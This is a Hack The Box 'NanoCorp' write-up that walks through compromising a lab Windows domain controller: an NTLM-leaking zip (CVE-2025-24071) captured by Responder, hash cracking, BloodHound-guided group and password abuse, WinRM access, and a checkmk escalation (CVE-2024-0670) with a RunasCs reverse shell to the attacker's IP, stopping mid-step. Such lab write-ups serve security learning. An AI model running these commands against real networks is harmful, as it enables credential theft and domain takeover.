---
title: NanoCorp [Hard]
date: 2025-11-12
tags: [htb, windows, nmap, check_mk, cve-2025-24071, bloodhound, acl, winrmexec, responder, zip file, john, ntlm-reflection, nxc, smb, penelope, cve-2024-0670, faketime, impacket-secretsdump, cve-2025-33073, evil-winrm]
categories: [HTB Writeups]
author: 2Fa0n
img_path: /assets/img/nanocorp-htb-season9
image: /assets/img/nanocorp-htb-season9/nanocorp-htb-season9_banner.png
---

# NanoCorp HTB Season 9
## Machine information
Author: [EmSec](https://app.hackthebox.com/users/962022)

## Enumeration
### Nmap
```bash
└─$ sudo nmap -Pn -sC -sV 10.129.xx.xx                                       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 21:03 EST
Nmap scan report for 10.129.xx.xx
Host is up (0.27s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
80/tcp   open  http              Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-title: Did not follow redirect to http://nanocorp.htb/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-11-09 09:04:04Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
5986/tcp open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=dc01.nanocorp.htb
| Subject Alternative Name: DNS:dc01.nanocorp.htb
| Not valid before: 2025-04-06T22:58:43
|_Not valid after:  2026-04-06T23:18:43
|_ssl-date: TLS randomness does not represent time
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
Service Info: Hosts: nanocorp.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m57s
| smb2-time: 
|   date: 2025-11-09T09:04:38
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 121.01 seconds
```

We see that the `clock-skew: 6h59m57s` is `+7h` more, so we will use `faketime -f '+7h' <commands>` and also we gonna scan all ports cause doing windows machine is wide so recon infos as mush as possible.

```bash
└─$ faketime -f '+7h' sudo nmap -p- -Pn -sC -sV 10.129.xx.xx
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-09 09:00 EST
Nmap scan report for nanocorp.htb (10.129.xx.xx)
Host is up (0.20s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Nanocorp
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-09 21:11:44Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-11-09T21:13:21+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.nanocorp.htb
| Not valid before: 2025-10-20T01:58:09
|_Not valid after:  2026-04-21T01:58:09
| rdp-ntlm-info: 
|   Target_Name: NANOCORP
|   NetBIOS_Domain_Name: NANOCORP
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: nanocorp.htb
|   DNS_Computer_Name: DC01.nanocorp.htb
|   DNS_Tree_Name: nanocorp.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-09T21:12:42+00:00
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.nanocorp.htb
| Subject Alternative Name: DNS:dc01.nanocorp.htb
| Not valid before: 2025-04-06T22:58:43
|_Not valid after:  2026-04-06T23:18:43
|_http-title: Not Found
6556/tcp  open  check_mk      check_mk extension for Nagios 2.1.0p10
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
50722/tcp open  msrpc         Microsoft Windows RPC
50741/tcp open  msrpc         Microsoft Windows RPC
53905/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s
| smb2-time: 
|   date: 2025-11-09T21:12:41
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 802.70 seconds
```

So we got port `80` which we will go first and also port `6556` got version detected using `check_mk` which is quite interesting. <br>
But first let's add these to `/etc/hosts`.

```bash
10.129.xx.xx     nanocorp.htb dc01.nanocorp.htb
```

Now we will head to web server.

### Web Enumeration
Go to `http://nanocorp.htb`.

![NanoCorp Website](/assets/img/nanocorp-htb-season9/nanocorp-htb-season9_website.png)

Nothing special so we doing some `dirb` enum.

```bash
└─$ dirb http://nanocorp.htb/         

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Nov  8 21:29:39 2025
URL_BASE: http://nanocorp.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://nanocorp.htb/ ----
+ http://nanocorp.htb/aux (CODE:403|SIZE:301)                                                                                                                                                                                                                                                                              
+ http://nanocorp.htb/cgi-bin/ (CODE:403|SIZE:301)                                                                                                                                                                                                                                                                         
+ http://nanocorp.htb/com1 (CODE:403|SIZE:301)                                                                                                                                                                                                                                                                             
+ http://nanocorp.htb/com2 (CODE:403|SIZE:301)                                                                                                                                                                                                                                                                             
+ http://nanocorp.htb/com3 (CODE:403|SIZE:301)                                                                                                                                                                                                                                                                             
+ http://nanocorp.htb/con (CODE:403|SIZE:301)                                                                                                                                                                                                                                                                              
==> DIRECTORY: http://nanocorp.htb/css/                                                                                                                                                                                                                                                                                    
+ http://nanocorp.htb/examples (CODE:503|SIZE:401)                                                                                                                                                                                                                                                                         
==> DIRECTORY: http://nanocorp.htb/img/                                                                                                                                                                                                                                                                                    
+ http://nanocorp.htb/index.html (CODE:200|SIZE:16212)                                                                                                                                                                                                                                                                     
==> DIRECTORY: http://nanocorp.htb/js/                                                                                                                                                                                                                                                                                     
+ http://nanocorp.htb/licenses (CODE:403|SIZE:420)                                                                                                                                                                                                                                                                         
+ http://nanocorp.htb/lpt1 (CODE:403|SIZE:301)                                                                                                                                                                                                                                                                             
+ http://nanocorp.htb/lpt2 (CODE:403|SIZE:301)                                                                                                                                                                                                                                                                             
+ http://nanocorp.htb/nul (CODE:403|SIZE:301)                                                                                                                                                                                                                                                                        
+ http://nanocorp.htb/phpmyadmin (CODE:403|SIZE:301)                                                                                                                                                                                                                                                                       
+ http://nanocorp.htb/prn (CODE:403|SIZE:301)                                                                                                                                                                                                                                                                              
+ http://nanocorp.htb/server-info (CODE:403|SIZE:420)                                                                                                                                                                                                                                                                      
+ http://nanocorp.htb/server-status (CODE:403|SIZE:420)                                                                                                                                                                                                                                                                    
+ http://nanocorp.htb/webalizer (CODE:403|SIZE:301)                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                                                                                           
---- Entering directory: http://nanocorp.htb/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                                                                                                           
---- Entering directory: http://nanocorp.htb/img/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                                                                                                           
---- Entering directory: http://nanocorp.htb/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Sat Nov  8 21:47:28 2025
DOWNLOADED: 4612 - FOUND: 17
```

Do not seems things that got interesting, let's view page source.

![NanoCorp Website Subdomain](/assets/img/nanocorp-htb-season9/nanocorp-htb-season9_website-subdomain.png)

We found out another subdomain which is `hire`. <br>
&rarr; Let's add to `/etc/hosts`.

```bash
10.129.xx.xx     nanocorp.htb dc01.nanocorp.htb hire.nanocorp.htb
```

Let's check out `http://hire.nanocorp.htb/`.

![NanoCorp Website Hire](/assets/img/nanocorp-htb-season9/nanocorp-htb-season9_website-hire.png)

Got ourself a form to apply for some position and things got our eyes are upload `zip file only`.
From here, we remember to our past machine [fluffy-htb-season8](https://dudenation.github.io/posts/fluffy-htb-season8) which also mention this cve and related to upload zip file to `NTLM Hash Leak`.
&rarr; We will look back to [cve-2025-24071](https://dudenation.github.io/posts/fluffy-htb-season8/#cve-2025-24071) and using this [CVE-2025-24071_PoC](https://github.com/0x6rss/CVE-2025-24071_PoC).

> *The POC is taken from [CVE-2025-24071](https://cti.monster/blog/2025/03/18/CVE-2025-24071.html) so we can check it out for more details later on.*

Let's get to it.

### cve-2025-24071
```bash
└─$ python3 poc.py                                                                                                                            
Enter your file name: nanocorp
Enter IP (EX: 192.168.1.162): 10.xx.xx.xx
completed
```

```bash
└─$ ls
exploit.zip  poc.py
```

Now we start `responder` to capture the NTLM hash.

```bash
└─$ sudo responder -I tun0                
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.xx.xx.xx]
    Responder IPv6             [dead:beef:4::1003]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-43ZV7SA10GS]
    Responder Domain Name      [ZZPT.LOCAL]
    Responder DCE-RPC Port     [46515]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...
```

Then we will upload our `exploit.zip` to hire website.

![NanoCorp Website Hire Upload](/assets/img/nanocorp-htb-season9/nanocorp-htb-season9_website-hire-upload.png)

![NanoCorp Website Hire Upload Success](/assets/img/nanocorp-htb-season9/nanocorp-htb-season9_website-hire-upload-success.png)

After we upload success, back to our `responder`.

```bash
[SMB] NTLMv2-SSP Client   : 10.129.xx.xx                                                                                                                                    
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:fafbe9ffb44508a9:8E2D4570E695D02882B628285811D5D5:010100000000000000BB23D1FD50DC01AE7557D4F8D06F3F00000000020008005A005A005000540001001E00570049004E002D00340033005A005600370053004100310030004700530004003400570049004E002D00340033005A00560037005300410031003000470053002E005A005A00500054002E004C004F00430041004C00030014005A005A00500054002E004C004F00430041004C00050014005A005A00500054002E004C004F00430041004C000700080000BB23D1FD50DC0106000400020000000800300030000000000000000000000000200000471ADC0E3FFBE095478B231D2F85ADA3CE94B02E4293D9EBA298408D56AB489C0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0035000000000000000000
```

We capture the NTLM Hash for `web_svc`. <br>
&rarr; Gonna crack it out.

```bash
└─$ john web_svc.hash --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dkxxxxxxxxxxxx   (web_svc)     
1g 0:00:00:02 DONE (2025-11-08 22:31) 0.3816g/s 708396p/s 708396c/s 708396C/s dobson5499..dixielove!
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Got `web_svc:dkxxxxxxxxxxxx`. <br>
&rarr; Let's verify it.

```bash
└─$ sudo nxc smb dc01.nanocorp.htb -u 'web_svc' -p 'dkxxxxxxxxxxxx'                                         
SMB         10.129.xx.xx    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.xx.xx    445    DC01             [+] nanocorp.htb\web_svc:dkxxxxxxxxxxxx
```

It good to go, doing some enumrate around `smb` to see if we can access any folder with `web_svc`.

```bash
└─$ sudo nxc smb dc01.nanocorp.htb -u 'web_svc' -p 'dkxxxxxxxxxxxx' --shares
SMB         10.129.xx.xx    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.xx.xx    445    DC01             [+] nanocorp.htb\web_svc:dkxxxxxxxxxxxx 
SMB         10.129.xx.xx    445    DC01             [*] Enumerated shares
SMB         10.129.xx.xx    445    DC01             Share           Permissions     Remark
SMB         10.129.xx.xx    445    DC01             -----           -----------     ------
SMB         10.129.xx.xx    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.xx.xx    445    DC01             C$                              Default share
SMB         10.129.xx.xx    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.xx.xx    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.xx.xx    445    DC01             SYSVOL          READ            Logon server share
```

Let's enum users to see that is our next target.

```bash
└─$ sudo nxc smb dc01.nanocorp.htb -u 'web_svc' -p 'dkxxxxxxxxxxxx' --users                               
SMB         10.129.xx.xx    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.xx.xx    445    DC01             [+] nanocorp.htb\web_svc:dkxxxxxxxxxxxx 
SMB         10.129.xx.xx    445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.xx.xx    445    DC01             Administrator                 2025-04-09 23:00:49 0       Built-in account for administering the computer/domain 
SMB         10.129.xx.xx    445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.xx.xx    445    DC01             krbtgt                        2025-04-03 01:38:45 0       Key Distribution Center Service Account 
SMB         10.129.xx.xx    445    DC01             web_svc                       2025-04-09 22:59:38 0        
SMB         10.129.xx.xx    445    DC01             monitoring_svc                2025-11-09 10:33:55 0        
SMB         10.129.xx.xx    445    DC01             [*] Enumerated 5 local users: NANOCORP
```

We got another user `monitoring_svc`. <br>
&rarr; Let's head to `bloodhound`.

> *Remember to generate new `/etc/krb5.conf` cause using kerberos services so having this one can sync when we doing and not getting some error.*
> *Also the clock skew is so strong so we will use `faketime` all the way and the `+<hours>` depends on our countries so be sure to check this one carefully.*

### Bloodhound
```bash
└─$ faketime -f '+7h' bloodhound-ce-python -ns 10.129.xx.xx -dc dc01.nanocorp.htb -d nanocorp.htb -u 'web_svc' -p 'dkxxxxxxxxxxxx' -c All --zip
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: nanocorp.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.nanocorp.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.nanocorp.htb
INFO: Found 6 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.nanocorp.htb
INFO: Done in 00M 55S
INFO: Compressing output into 20251109114435_bloodhound.zip
```

Let's inject the zip file to `bloodhound` and discuss about this.

![NanoCorp Bloodhound Shortest Path](/assets/img/nanocorp-htb-season9/nanocorp-htb-season9_bloodhound-shortest-path.png)

Cause we also got `web_svc`, we will find path from this user.

![NanoCorp Bloodhound Shortest Path Result](/assets/img/nanocorp-htb-season9/nanocorp-htb-season9_bloodhound-shortest-path-result.png)

We can see that `WEB_SVC@NANOCORP.HTB` can `AddSelf` to `IT_SUPPORT@NANOCORP.HTB` and this group got `ForceChangePassword` to `MONITORING_SVC@NANOCORP.HTB`. <br>
&rarr; Which is a really straightforward path so let's hit it.

First we will [addmember](https://www.thehacker.recipes/ad/movement/dacl/addmember) `web_svc` to `IT_Support` group.

```bash
└─$ faketime -f '+7h' bloodyAD --host dc01.nanocorp.htb -d nanocorp.htb -u 'web_svc' -p 'dkxxxxxxxxxxxx' add groupMember IT_SUPPORT web_svc 
[+] web_svc added to IT_SUPPORT
```

Then reset the password for `monitoring_svc` via [forcechangepassword](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword).

```bash
└─$ faketime -f '+7h' bloodyAD --host dc01.nanocorp.htb -d nanocorp.htb -u 'web_svc' -p 'dkxxxxxxxxxxxx' set password monitoring_svc Pass@123
[+] Password changed successfully!
```

Now let's enter this session with [winrmexec](https://github.com/ozelis/winrmexec) cause there is port `5986` only.

```bash
└─$ faketime -f '+7h' python3 winrmexec/evil_winrmexec.py -ssl -port 5986 -k nanocorp.htb/monitoring_svc:'Pass@123'@dc01.nanocorp.htb
[*] '-target_ip' not specified, using dc01.nanocorp.htb
[*] '-url' not specified, using https://dc01.nanocorp.htb:5986/wsman
[*] '-spn' not specified, using HTTP/dc01.nanocorp.htb@nanocorp.htb
[*] '-dc-ip' not specified, using nanocorp.htb
[*] requesting TGT for nanocorp.htb\monitoring_svc
[*] requesting TGS for HTTP/dc01.nanocorp.htb@nanocorp.htb

Ctrl+D to exit, Ctrl+C will try to interrupt the running pipeline gracefully
This is not an interactive shell! If you need to run programs that expect
inputs from stdin, or exploits that spawn cmd.exe, etc., pop a !revshell

Special !bangs:
  !download RPATH [LPATH]          # downloads a file or directory (as a zip file); use 'PATH'
                                   # if it contains whitespace

  !upload [-xor] LPATH [RPATH]     # uploads a file; use 'PATH' if it contains whitespace, though use iwr
                                   # if you can reach your ip from the box, because this can be slow;
                                   # use -xor only in conjunction with !psrun/!netrun

  !amsi                            # amsi bypass, run this right after you get a prompt

  !psrun [-xor] URL                # run .ps1 script from url; uses ScriptBlock smuggling, so no !amsi patching is
                                   # needed unless that script tries to load a .NET assembly; if you can't reach
                                   # your ip, !upload with -xor first, then !psrun -xor 'c:\foo\bar.ps1' (needs absolute path)

  !netrun [-xor] URL [ARG] [ARG]   # run .NET assembly from url, use 'ARG' if it contains whitespace;
                                   # !amsi first if you're getting '...program with an incorrect format' errors;
                                   # if you can't reach your ip, !upload with -xor first then !netrun -xor 'c:\foo\bar.exe' (needs absolute path)

  !revshell IP PORT                # pop a revshell at IP:PORT with stdin/out/err redirected through a socket; if you can't reach your ip and you
                                   # you need to run an executable that expects input, try:
                                   # PS> Set-Content -Encoding ASCII 'stdin.txt' "line1`nline2`nline3"
                                   # PS> Start-Process some.exe -RedirectStandardInput 'stdin.txt' -RedirectStandardOutput 'stdout.txt'

  !log                             # start logging output to winrmexec_[timestamp]_stdout.log
  !stoplog                         # stop logging output to winrmexec_[timestamp]_stdout.log

PS C:\Users\monitoring_svc\Documents>
```

There we go!

```powershell
PS C:\Users\monitoring_svc\Desktop> dir


    Directory: C:\Users\monitoring_svc\Desktop


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-ar---         11/9/2025   1:02 AM             34 user.txt                                                              
PS C:\Users\monitoring_svc\Desktop> type user.txt
bf9002xxxxxxxxxxxxxxxxxxxxxxxxxx
```

Got our `user.txt` flag.

> *This user path seems pretty not that much hard, could it be author want to give us some easy entrance before harder root path part :D.*

## Initial Access
After we gain inside `monitoring_svc`, we remember that there is still one port we have one use to discuss yet which is `6556`. <br>
&rarr; As we can scan it out from nmap so let's `nc` to see what happen.

### check_mk
```bash
└─$ nc nanocorp.htb 6556
<<<check_mk>>>
Version: 2.1.0p10
BuildDate: Aug 19 2022
AgentOS: windows
Hostname: DC01
Architecture: 64bit
WorkingDirectory: C:\Windows\system32
ConfigFile: C:\Program Files (x86)\checkmk\service\check_mk.yml
LocalConfigFile: C:\ProgramData\checkmk\agent\check_mk.user.yml
AgentDirectory: C:\Program Files (x86)\checkmk\service
PluginsDirectory: C:\ProgramData\checkmk\agent\plugins
StateDirectory: C:\ProgramData\checkmk\agent\state
ConfigDirectory: C:\ProgramData\checkmk\agent\config
TempDirectory: C:\ProgramData\checkmk\agent\tmp
LogDirectory: C:\ProgramData\checkmk\agent\log
SpoolDirectory: C:\ProgramData\checkmk\agent\spool
LocalDirectory: C:\ProgramData\checkmk\agent\local
<SNIP>
```

The output is alot so we put into my file and take a look at it.

![NanoCorp Check_MK Output](/assets/img/nanocorp-htb-season9/nanocorp-htb-season9_check-mk-output.png)

We see that there is `TempDirectory: C:\ProgramData\checkmk\agent\tmp` that check_mk agent is running on so let's check our the proccess of this.

```powershell
PS C:\Users\monitoring_svc\Documents> Get-Process | Where-Object {$_.Name -match "check_mk"} | Format-List ProcessName,Id,Path,StartTime,Responding


ProcessName : check_mk_agent
Id          : 1268
Path        : 
StartTime   : 
Responding  : True
```

So we see there is id `1268`, let's check it out from the output file.

![NanoCorp Check_MK Agent Output](/assets/img/nanocorp-htb-season9/nanocorp-htb-season9_check-mk-agent-output.png)

It was running under `NT AUTHORITY\SYSTEM` so this could be potential way to privilege escalation to `root`. <br>
&rarr; So we taking some googling.

![NanoCorp Check_MK Agent Google](/assets/img/nanocorp-htb-season9/nanocorp-htb-season9_check-mk-agent-google.png)

Found this one [local-privilege-escalation-via-writable-files-in-checkmk-agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/) and related to [cve-2024-0670](https://nvd.nist.gov/vuln/detail/cve-2024-0670).

## Privilege Escalation
We will take some look at the [blog](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/) and then gonna exploit based on [cve-2024-0670](https://nvd.nist.gov/vuln/detail/cve-2024-0670).

### cve-2024-0670 (intended way)
From the blog it said with big line bold sentence that.

**The Checkmk agent allows a local privilege escalation on a Windows system. The agent creates and executes temporary files that can be manipulated by an attacker.**

And it also provide details POC for us to exploit our target as well.

![NanoCorp Check_MK Agent Trigger](/assets/img/nanocorp-htb-season9/nanocorp-htb-season9_check-mk-agent-trigger.png)

It can be trigger wit this command `msiexec /fa C:\Windows\Installer\fafda3e.msi` but `fafda3e.msi` is different on every system so we need to find the match one with check_mk agent.

```powershell
PS C:\Windows\Installer> dir


    Directory: C:\Windows\Installer


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
d-----          4/2/2025   6:25 PM                {6070BE95-B84D-40FE-8ABD-C70B59F5A164}                                
d-----          4/5/2025   4:17 PM                {675A6D5C-FF5A-11EF-AEA3-1967AD678D6D}                                
-a----         3/28/2025   3:08 PM       12637696 1e6f2.msi                                                             
-a----         5/10/2023   9:16 AM         184320 387c2.msi                                                             
-a----         5/10/2023   9:21 AM         184320 387c6.msi                                                             
-a----         5/10/2023   9:35 AM         192512 387ca.msi                                                             
-a----         5/10/2023   9:39 AM         192512 387ce.msi                                                             
-a----          4/2/2025   6:24 PM       60895232 387d1.msi                                                             
-a----          4/2/2025   6:24 PM          20480 SourceHash{0025DD72-A959-45B5-A0A3-7EFEB15A8050}                      
-a----          4/2/2025   6:25 PM          20480 SourceHash{6070BE95-B84D-40FE-8ABD-C70B59F5A164}                      
-a----          4/5/2025   4:17 PM          20480 SourceHash{675A6D5C-FF5A-11EF-AEA3-1967AD678D6D}                      
-a----          4/2/2025   6:24 PM          20480 SourceHash{73F77E4E-5A17-46E5-A5FC-8A061047725F}                      
-a----          4/2/2025   6:24 PM          20480 SourceHash{C2C59CAB-8766-4ABD-A8EF-1151A36C41E5}                      
-a----          4/2/2025   6:24 PM          20480 SourceHash{D5D19E2F-7189-42FE-8103-92CD1FA457C2}
```

```powershell
PS C:\Windows\Installer> Get-ChildItem C:\Windows\Installer\*.msi | ForEach-Object { $i = New-Object -ComObject WindowsInstaller.Installer; $db = $i.OpenDatabase($_.FullName, 0); $v = $db.OpenView("SELECT Value FROM Property WHERE Property='ProductName'"); $v.Execute(); $r = $v.Fetch(); if($r) { Write-Host "$($_.Na
me) - $($r.StringData(1))" }; $v.Close() }
1e6f2.msi - Check MK Agent 2.1
387c2.msi - Microsoft Visual C++ 2022 X86 Minimum Runtime - 14.36.32532
387c6.msi - Microsoft Visual C++ 2022 X86 Additional Runtime - 14.36.32532
387ca.msi - Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.36.32532
387ce.msi - Microsoft Visual C++ 2022 X64 Additional Runtime - 14.36.32532
387d1.msi - VMware Tools
```

So we found out `1e6f2.msi` is the one we need. <br>
&rarr; Let's give it a run to see what happen.

```powershell
PS C:\Windows\Installer> Get-Process | Where-Object {$_.Name -match "check_mk_agent"}

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                   
-------  ------    -----      -----     ------     --  -- -----------                                                   
    335      17     7068      18432              1268   0 check_mk_agent
```

```powershell
PS C:\Windows\Installer> msiexec /fa C:\Windows\Installer\1e6f2.msi
PS C:\Windows\Installer> Get-Process | Where-Object {$_.Name -match "check_mk_agent"}

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                   
-------  ------    -----      -----     ------     --  -- -----------                                                   
    335      17     7068      18432              1268   0 check_mk_agent
```

We can see there is no change when running the triger, let's see if we can access the `C:\Windows\Temp` from `monitoring_svc`.

```powershell
PS C:\Windows\Temp> dir
Access to the path 'C:\Windows\Temp' is denied.
```

Got denied so we need to switch back to `web_svc` by using [RunasCs](https://github.com/antonioCoco/RunasCs).

```bash
└─$ wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip

└─$ unzip RunasCs.zip 
Archive:  RunasCs.zip
  inflating: RunasCs.exe             
  inflating: RunasCs_net2.exe
```

Go to the `%TEMP%` or `$env:TEMP` and upload `RunasCs.exe`.

```powershell
PS C:\Users\monitoring_svc\AppData\Local\Temp> !upload RunasCs.exe
uploading to C:\Users\monitoring_svc\AppData\Local\Temp\577dca2544bdf3b6.tmp
moving from C:\Users\monitoring_svc\AppData\Local\Temp\577dca2544bdf3b6.tmp to RunasCs.exe
```

```powershell
PS C:\Users\monitoring_svc\AppData\Local\Temp> dir


    Directory: C:\Users\monitoring_svc\AppData\Local\Temp


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                                                                            
-a----        11/10/2025   3:41 AM          51712 RunasCs.exe
```

Start our penelope.

```bash
└─$ penelope -p 4545                                                                              
[+] Listening for reverse shells on 0.0.0.0:4545 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 172.21.0.1 • 10.xx.xx.xx
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Run the [RunasCs](https://arttoolkit.github.io/wadcoms/RunasCs/) to connect back our reverse shell.

```powershell
PS C:\Users\monitoring_svc\AppData\Local\Temp> .\RunasCs.exe 'web_svc' 'dkxxxxxxxxxxxx' powershell -r 10.xx.xx.xx:4545

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-a22f86$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 1064 created in background.
```

```powershell
└─$ penelope -p 4545                                                                              
